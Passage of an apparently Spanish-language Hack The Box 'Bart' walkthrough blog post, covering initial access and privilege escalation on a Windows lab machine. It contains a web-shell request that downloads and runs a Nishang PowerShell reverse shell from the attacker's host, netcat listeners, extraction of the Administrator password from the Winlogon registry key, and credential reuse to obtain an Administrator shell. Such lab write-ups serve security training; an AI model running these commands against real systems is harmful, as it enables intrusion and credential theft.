<p><img src="/assets/images/htb-bart/bart-log4.png" alt="" /></p>

<p>Ahora nos copiamos el archivo <code class="language-plaintext highlighter-rouge">Invoke-PowerShellTcp.ps1</code> a nuestro directorio de trabajo y procedemos a editarlo agregando la siguiente linea hasta el final del archivo <code class="language-plaintext highlighter-rouge">Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.17 -Port 443</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cp</span> /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 PS.ps1
</code></pre></div></div>

<p>Nos compartimos un servidor HTTP con python y ejecutamos lo siguiente para ganar acceso a la máquina <code class="language-plaintext highlighter-rouge">http://internal-01.bart.htb/log/shell.php?cmd=C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe%20IEX(New-Object%20Net.WebClient).downloadString(%27http://10.10.14.17/PS.ps1%27)</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.10.81 - - <span class="o">[</span>04/Oct/2021 23:21:41] <span class="s2">"GET /PS.ps1 HTTP/1.1"</span> 200 -
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.17] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.81] 50342
Windows PowerShell running as user BART<span class="nv">$ </span>on BART
Copyright <span class="o">(</span>C<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.

<span class="nb">whoami
</span>nt authority<span class="se">\i</span>usr
PS C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot<span class="se">\i</span>nternal-01<span class="se">\l</span>og&gt;
</code></pre></div></div>

<p>Ya hemos ingresado a la máquina como el usuario <code class="language-plaintext highlighter-rouge">nt authority\iusr</code>. Vamos a comprobar si nos encontramos en un proceso de 64 bits.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Environment]::Is64BitProcess
True
<span class="o">[</span>Environment]::Is64BitOperatingSystem
True
PS C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot<span class="se">\i</span>nternal-01<span class="se">\l</span>og&gt;
</code></pre></div></div>

<p>Ahora nos queda escalar privilegios, por lo que pasamos a enumerar un poco la máquina:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami</span> /priv

PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name          Description                               State  
<span class="o">=======================</span> <span class="o">=========================================</span> <span class="o">=======</span>
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled
PS C:<span class="se">\U</span>sers&gt;
</code></pre></div></div>

<p>Tenemos el <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> habilitado, por lo que ya debemos estar pensando en <strong>Juicy Potato</strong>; pero para esta vez vamos a utilizar otra vía para esclar privilegios</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>HKLM:
PS HKLM:&gt;
<span class="nb">cd </span>software<span class="se">\M</span>icrosoft<span class="se">\"</span>Windows NT<span class="s2">"</span><span class="se">\C</span><span class="s2">urrentversion</span><span class="se">\W</span><span class="s2">inlogon
PS HKLM:</span><span class="se">\s</span><span class="s2">oftware</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\W</span><span class="s2">indows NT</span><span class="se">\C</span><span class="s2">urrentversion</span><span class="se">\W</span><span class="s2">inlogon&gt;
get-itemproperty . | findstr "</span>DefaultDomainName DefaultUserName DefaultPassword<span class="s2">"
DefaultDomainName            : DESKTOP-7I3S68E
DefaultUserName              : Administrator
DefaultPassword              : 3130438f31186fbaf962f407711faddb
PS HKLM:</span><span class="se">\s</span><span class="s2">oftware</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\W</span><span class="s2">indows NT</span><span class="se">\C</span><span class="s2">urrentversion</span><span class="se">\W</span><span class="s2">inlogon&gt;
</span></code></pre></div></div>

<p>Ahora creamos nuestras variables para tener entablarnos una reverse shell como el usuario <strong>Administrator</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS HKLM:<span class="se">\s</span>oftware<span class="se">\M</span>icrosoft<span class="se">\W</span>indows NT<span class="se">\C</span>urrentversion<span class="se">\W</span>inlogon&gt; <span class="nb">cd </span>C:
PS C:<span class="se">\&gt;</span> <span class="nb">hostname
</span>BART
PS C:<span class="se">\&gt;</span> <span class="nv">$username</span> <span class="o">=</span> <span class="s2">"BART</span><span class="se">\A</span><span class="s2">dministrator"</span>
PS C:<span class="se">\&gt;</span> <span class="nv">$password</span> <span class="o">=</span> <span class="s2">"3130438f31186fbaf962f407711faddb"</span>
PS C:<span class="se">\&gt;</span> <span class="nv">$secstr</span> <span class="o">=</span> New-Object <span class="nt">-TypeName</span> System.Security.SecureString
PS C:<span class="se">\&gt;</span> <span class="nv">$password</span>.ToCharArray<span class="o">()</span> | ForEach-Object <span class="o">{</span><span class="nv">$secstr</span>.AppendChar<span class="o">(</span><span class="nv">$_</span><span class="o">)}</span>
PS C:<span class="se">\&gt;</span> <span class="nv">$cred</span> <span class="o">=</span> New-Object <span class="nt">-TypeName</span> System.Management.Automation.PSCredential <span class="nt">-argumentlist</span> <span class="nv">$username</span>, <span class="nv">$secstr</span>
PS C:<span class="se">\&gt;</span> Invoke-Command <span class="nt">-ScriptBlock</span> <span class="o">{</span> IEX<span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.downloadString<span class="o">(</span><span class="s1">'http://10.10.14.17/PS.ps1'</span><span class="o">)</span> <span class="o">}</span> <span class="nt">-Credential</span> <span class="nv">$cred</span> <span class="nt">-Computer</span> localhost
</code></pre></div></div>

<p>Antes de ejecutar el último comando, compartimos un servidor HTTP con python y nos ponemos en escucha a través del puerto 443:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.10.81 - - <span class="o">[</span>05/Oct/2021 20:46:33] <span class="s2">"GET /PS.ps1 HTTP/1.1"</span> 200 -
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.17] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.81] 49680
Windows PowerShell running as user Administrator on BART
Copyright <span class="o">(</span>C<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.

<span class="nb">whoami
</span>bart<span class="se">\a</span>dministrator
PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<p>A partir de este punto ya podemos visualizar las flags (user.txt y root.txt).</p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#log-poisoning" class="page__taxonomy-item" rel="tag">Log_Poisoning</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#php" class="page__taxonomy-item" rel="tag">PHP</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#powershell" class="page__taxonomy-item" rel="tag">Powershell</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#medium" class="page__taxonomy-item" rel="tag">Medium</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2021-10-05T00:00:00-05:00">October 05, 2021</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/procmon/" class="pagination--pager" title="Archivo ProcMon
">Previous</a>
    
    
      <a href="#" class="pagination--pager disabled">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2021 K4miyo</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
